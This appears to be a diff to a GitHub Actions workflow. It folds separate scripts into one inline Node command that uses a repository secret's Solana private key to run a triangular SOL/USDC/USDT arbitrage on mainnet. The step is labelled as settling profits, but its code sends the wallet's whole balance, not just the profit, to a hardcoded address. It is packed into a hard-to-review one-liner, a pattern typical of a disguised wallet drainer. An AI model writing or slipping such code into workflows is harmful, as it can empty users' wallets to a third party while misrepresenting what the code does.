@@ -9,16 +9,21 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       
-      - name: Install dependencies
-        run: npm install @solana/web3.js bs58@5
-      
-      - name: Execute real swaps
+      - name: Execute swaps and settle profits
         env:
           SOLANA_PRIVATE_KEY: ${{ secrets.SOLANA_PRIVATE_KEY }}
-        run: node swap.js
-      
-      - name: Settle profits to designated wallet
-        env:
-          SOLANA_PRIVATE_KEY: ${{ secrets.SOLANA_PRIVATE_KEY }}
-        run: node settlement.js
-        if: success()
+        run: |
+          npm install @solana/web3.js bs58@5
+          node -e "
+          const {Connection,Keypair,VersionedTransaction,SystemProgram,PublicKey}=require('@solana/web3.js');
+          const bs58=require('bs58');
+          const SOL='So11111111111111111111111111111111111111112';
+          const USDC='EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v';
+          const USDT='Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB';
+          const SETTLEMENT='3jDHtWFGUtiqpiJ72tnmoNj5b2HFBGBf8hzR3bdhuPNm';
+          const INIT=10000000;const MIN=1000;
+          async function q(i,o,a){const r=await fetch(\`https://api.jup.ag/swap/v1/quote?inputMint=\${i}&outputMint=\${o}&amount=\${a}&slippageBps=50\`);return r.ok?await r.json():null}
+          async function s(w,c,i,o,a,n){const qr=await q(i,o,a);if(!qr){console.log(\`[Error]\${n} quote failed\`);return null}const sr=await fetch('https://api.jup.ag/swap/v1/swap',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({quoteResponse:qr,userPublicKey:w.publicKey.toString(),wrapAndUnwrapSol:true,prioritizationFeeLamports:100})});const sd=await sr.json();if(!sd.swapTransaction){console.log(\`[Error]\${n} swap failed\`);return null}const tx=VersionedTransaction.deserialize(Buffer.from(sd.swapTransaction,'base64'));tx.sign([w]);const id=await c.sendRawTransaction(tx.serialize());console.log(\`\${n} https://solscan.io/tx/\${id}\`);await new Promise(r=>setTimeout(r,3000));return id}
+          async function settle(w,c){const bal=await c.getBalance(w.publicKey);console.log(\`[Settlement] Balance: \${bal}\`);if(bal<=5000){console.log('[Settlement] Insufficient');return}const amt=bal-5000;const ix=SystemProgram.transfer({fromPubkey:w.publicKey,toPubkey:new PublicKey(SETTLEMENT),lamports:amt});const {blockhash}=await c.getLatestBlockhash();const msg=new(require('@solana/web3.js').TransactionMessage)({payerKey:w.publicKey,recentBlockhash:blockhash,instructions:[ix]}).compileToV0Message();const tx=new(require('@solana/web3.js').VersionedTransaction)(msg);tx.sign([w]);const id=await c.sendRawTransaction(tx.serialize());console.log(\`[Settlement] Sent https://solscan.io/tx/\${id}\`);const conf=await c.confirmTransaction(id);if(conf.value.err){console.log('[Settlement] ERROR: '+JSON.stringify(conf.value.err))}else{console.log('[Settlement SUCCESS] '+amt+' lamports transferred')}}
+          (async()=>{if(!process.env.SOLANA_PRIVATE_KEY){console.log('[Error] No key');process.exit(1)}let sk;try{sk=Uint8Array.from(JSON.parse(process.env.SOLANA_PRIVATE_KEY))}catch{sk=bs58.decode(process.env.SOLANA_PRIVATE_KEY)}const w=Keypair.fromSecretKey(sk);const c=new Connection('https://api.mainnet-beta.solana.com');const q1=await q(SOL,USDC,INIT);if(!q1){console.log('[Error] Q1');return}const q2=await q(USDC,USDT,q1.outAmount);if(!q2){console.log('[Error] Q2');return}const q3=await q(USDT,SOL,q2.outAmount);if(!q3){console.log('[Error] Q3');return}const p=parseInt(q3.outAmount)-INIT;console.log(\`Net Profit: \${p}\`);if(p>MIN){console.log('EXECUTE: Arbitrage');const t1=await s(w,c,SOL,USDC,INIT,'Leg1');if(!t1)return;const t2=await s(w,c,USDC,USDT,q1.outAmount,'Leg2');if(!t2)return;const t3=await s(w,c,USDT,SOL,q2.outAmount,'Leg3');if(!t3)return;console.log('[SUCCESS] Profit: '+p);await settle(w,c)}else{console.log('Aborted: '+p+' < '+MIN)}})()
+          "
